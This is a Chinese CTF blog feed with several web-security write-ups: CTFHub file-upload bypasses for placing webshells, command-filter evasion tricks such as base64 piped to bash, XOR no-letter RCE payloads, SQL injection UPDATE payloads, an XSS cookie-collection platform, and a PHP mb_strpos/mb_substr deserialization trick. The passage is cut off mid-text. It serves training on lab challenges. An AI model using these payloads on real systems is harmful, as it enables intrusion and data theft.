    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="文件上传">文件上传</h2><blockquote><p>来源：CTFHub技能树</p></blockquote><h4 id="无验证">无验证</h4><blockquote><p>直接上传一句话木马，会显示路径，直接蚁剑连接找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112713829.png" alt="image-20241109112713829"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112741306.png" alt="image-20241109112741306"></p><h4 id="前端验证">前端验证</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112850962.png" alt="image-20241109112850962"></p><blockquote><p>查看源代码，发现进行了前端验证，必须是jpg,png或者gif文件。</p><p>直接抓包改包发送绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113155795.png" alt="image-20241109113155795"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113230322.png" alt="image-20241109113230322"></p><blockquote><p>上传成功，直接蚁剑连接找flag就行。</p></blockquote><h4 id="htaccess">.htaccess</h4><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></blockquote><blockquote><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p></blockquote><blockquote><p>所以先创建一个 .htaccess的文件，里面输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;pass777&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>表示文件名中包含pass777的文件都会被当作php执行</p><p>所以再写一个一句话木马，文件名中包含pass777，上传后用蚁剑连接就能拿到flag</p></blockquote><blockquote><p>ctfhub{2428d2cef017f7d0e902eaac}</p></blockquote><h4 id="MIME绕过">MIME绕过</h4><blockquote><p>直接将一句话木马后缀改成jpg，然后抓包修改成php，蚁剑连接就能拿到</p><p>ctfhub{c76881cacfd16db8afee74fd}</p></blockquote><h4 id="00截断">00截断</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120203556473.png" alt="image-20241120203556473"></p><blockquote><p>根据前端提示，发现上传类型限制成了jpg,png,gif文件，并且如果文件类型被允许，构造目标路径（<code>$des</code>），该路径由<code>$_GET['road']</code>（从URL的查询字符串中获取），一个随机数（10到99之间），当前日期和时间（格式为<code>YmdHis</code>），以及文件扩展名组成，并使用<code>move_uploaded_file()</code>函数将上传的文件从临时目录移动到目标目录（<code>$des</code>）</p><p>所以在路径处修改成.php的路径，然后用%00截断，让后面添加的目录失效</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120204749984.png" alt="image-20241120204749984"></p><blockquote><p>由于我们修改了路径，所以保存路径就是原来的/upload/yjh-cmd.php</p><p><a href="http://xn--challenge-a074b1b840a3ecbe-uw57b2z5yej5jvy6b.sandbox.ctfhub.com:10800/upload/123.php">蚁剑连接challenge-a074b1b840a3ecbe.sandbox.ctfhub.com:10800/upload/123.php</a></p><p>ctfhub{e158c8b8eb6fdb23553ce830}</p></blockquote><h4 id="双写后缀">双写后缀</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><blockquote><p>看提示发现过滤了一系列后缀，然后会把后缀替换成无，所以双写绕过,如：yjh.pphphp</p><p>ctfhub{a0a5473d07fac34189262488}</p></blockquote><h4 id="文件头检查">文件头检查</h4><blockquote><p>先随便上传一个文件，然后有提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211213870.png" alt="image-20241120211213870"></p><blockquote><p>那就抓包修改文件类型,同时在一句话木马前加上GIF89a,用来表示这是一个图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211402688.png" alt="image-20241120211402688"></p><blockquote><p>蚁剑连接得到flag</p><p>ctfhub{5602bccd8ab06a8c2408fb81}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub文件上传系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>命令执行过滤关键字</title>
    <link href="https://m3x1.cn/posts/d36c6b6d.html"/>
    <id>https://m3x1.cn/posts/d36c6b6d.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2024-12-02T08:48:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤关键字">过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1''ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用* 匹配任意 <code>cat y1n*</code><br>用?匹配任意 <code>cat y1n?</code><br>用{ }匹配范围 <code>cat y1&#123;a..z&#125;g.php</code><br>变量 <code>$a=fl;$b=ag;cat $a$b.php</code><br>拼接绕过 <code>‘fl’.'ag'</code></p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+‘b’     输出:‘ab’<br>2.贴贴    eg: ‘a’‘b’       输出:‘ab’</p><p>PHP拼接:<br>.    eg: ‘a’.‘b’      输出:‘ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字">过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用&quot;&quot;，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过：">使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过：">嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累：">积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
    
    
    <summary type="html">🥧命令执行过滤关键字</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>HUBUCTF-2022-新生赛-wp</title>
    <link href="https://m3x1.cn/posts/1f67230d.html"/>
    <id>https://m3x1.cn/posts/1f67230d.html</id>
    <published>2024-11-28T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:35.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p>NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell">HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot; #可以用的符号</span><br><span class="line">answer = &quot;phpinfo&quot;  #要构造的命令</span><br><span class="line">tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i)^ord(j) == ord(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(tmp1,tmp2)</span><br><span class="line">//0302181 @[@[_^^ ，所以传入&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485}</p></blockquote><h2 id="Calculate">Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 假设这是我们要与之交互的网站的URL</span><br><span class="line">url = &#x27;http://node5.anna.nssctf.cn:28984/&#x27;  # 请替换为实际的URL</span><br><span class="line"></span><br><span class="line"># 创建一个会话来保持cookie和其他会话信息</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span><br><span class="line">pattern = re.compile(r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;)</span><br><span class="line"></span><br><span class="line"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span><br><span class="line">for i in range(20):</span><br><span class="line">    # 发送GET请求来获取当前页面</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    # 使用BeautifulSoup解析HTML内容</span><br><span class="line">    soup = BeautifulSoup(html_content, &#x27;html.parser&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 查找所有包含数字或运算符的&lt;div&gt;标签</span><br><span class="line">    divs = soup.find_all(&#x27;div&#x27;, text=re.compile(r&#x27;[0-9+\-*\/=]&#x27;))</span><br><span class="line">    </span><br><span class="line">    # 使用正则表达式从标签中提取数字或运算符</span><br><span class="line">    tokens = pattern.findall(str(divs))</span><br><span class="line">    </span><br><span class="line">    # 拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span><br><span class="line">    # 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span><br><span class="line">    # 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span><br><span class="line">    expression_parts = [token for token in tokens if token != &#x27;=&#x27;]</span><br><span class="line">    expression = &#x27;&#x27;.join(expression_parts).replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    print(expression)</span><br><span class="line">    # 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span><br><span class="line">    try:</span><br><span class="line">        result = eval(expression)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    # 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span><br><span class="line">    # 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span><br><span class="line">    time.sleep(1.1)</span><br><span class="line">    # 准备POST数据</span><br><span class="line">    post_data = &#123;&#x27;ans&#x27;: result&#125;</span><br><span class="line">    print(result)</span><br><span class="line">    # 发送POST请求将答案发送回服务器</span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 检查响应内容是否包含关键词&quot;ctf&quot;</span><br><span class="line">print(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 关闭会话</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql">ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line">#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line">#urlencode(#)=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBUCTF-2022-新生赛-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>XSS在线平台使用</title>
    <link href="https://m3x1.cn/posts/169f5f8e.html"/>
    <id>https://m3x1.cn/posts/169f5f8e.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2024-12-02T09:25:18.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
    
    
    <summary type="html">XSS在线平台使用</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>mb_strpos与mb_substr错位索引</title>
    <link href="https://m3x1.cn/posts/c81521cb.html"/>
    <id>https://m3x1.cn/posts/c81521cb.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T09:01:07.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mb-strpos与mb-substr错位索引">mb_strpos与mb_substr错位索引</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2. mb_substr和mb_strpos函数漏洞</span><br><span class="line">mb_strpos() 和 mb_substr() 是 PHP 中用于处理多字节字符的函数，专门用于处理 UTF-8 或其他多字节编码的字符串。</span><br><span class="line">(1)mb_strpos: 用于查找一个字符串在另一个字符串中第一次出现的位置（索引），返回结果是该子字符串第一次出现的位置（索引）。</span><br><span class="line">mb_strpos(string $haystack, string $needle, int $offset = 0, string $encoding = null): int|false</span><br><span class="line">    $haystack：要在其中搜索子字符串的源字符串。</span><br><span class="line">    $needle：要搜索的子字符串。</span><br><span class="line">    $offset（可选）：从哪个位置开始搜索，默认为 0。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br><span class="line"></span><br><span class="line">(2)mb_substr: 用于获取一个字符串的子串，返回结果是指定位置和长度的子字符串。</span><br><span class="line">mb_substr(string $string, int $start, int $length = null, string $encoding = null): string|false</span><br><span class="line">    $string：要截取的原始字符串。</span><br><span class="line">    $start：截取的起始位置。如果是负数，则表示从末尾开始计数。</span><br><span class="line">    $length（可选）：要截取的长度。如果未指定，则默认截取至字符串的末尾。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合4位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(1)mb_strpos遇到\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span><br><span class="line">mb_strpos(&quot;\xf0\x9fAAA&lt;BB&quot;, &#x27;&lt;&#x27;); #返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span><br><span class="line"></span><br><span class="line">(2)mb_substr遇到\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span><br><span class="line">mb_substr(&quot;\xf0\x9fAAA&lt;BB&quot;, 0, 4); #&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3. mb_substr和mb_strpos函数漏洞与本题结合</span><br><span class="line">通过控制C的长度可以控制我们想要执行$key的长度</span><br><span class="line">通过控制B我们可以控制索引值需要提前几位</span><br><span class="line">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function substrstr($data)</span><br><span class="line">&#123;</span><br><span class="line">    $start = mb_strpos($data, &quot;[&quot;);</span><br><span class="line">    $end = mb_strpos($data, &quot;]&quot;);</span><br><span class="line">    return mb_substr($data, $start + 1, $end - 1 - $start);</span><br><span class="line">&#125;</span><br><span class="line">class read_file&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $filename=&quot;/etc/passwd&quot;;</span><br><span class="line">    public function __construct($start)&#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;start == &quot;gxngxngxn&quot;)&#123;</span><br><span class="line">           echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;start&#x27;]))&#123;</span><br><span class="line">    $readfile = new read_file($_GET[&#x27;start&#x27;]);</span><br><span class="line">    $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;;</span><br><span class="line">    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123;</span><br><span class="line">        die(&quot;NONONO!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;);</span><br><span class="line">    unserialize($ctf);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Start_Funny_CTF!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>审计上述代码，发现传入参数start和read，会拼接read和realfile的序列化。</p><p>根据代码知道，在调用函数截取的时候是以 “[” 开始的，但是read里面又不能有 “[”，所以一定只能截取[]内的序列化。但是只有变量start是可控的，其它不可控，看似无解，但可利用上述的漏洞，让其发生错位索引，从而执行我们自己传入的序列化列表。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果start=gxngxngxn，序列化为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">如果我们自己构造一个序列化表传入，start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br><span class="line">序列化结果为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span 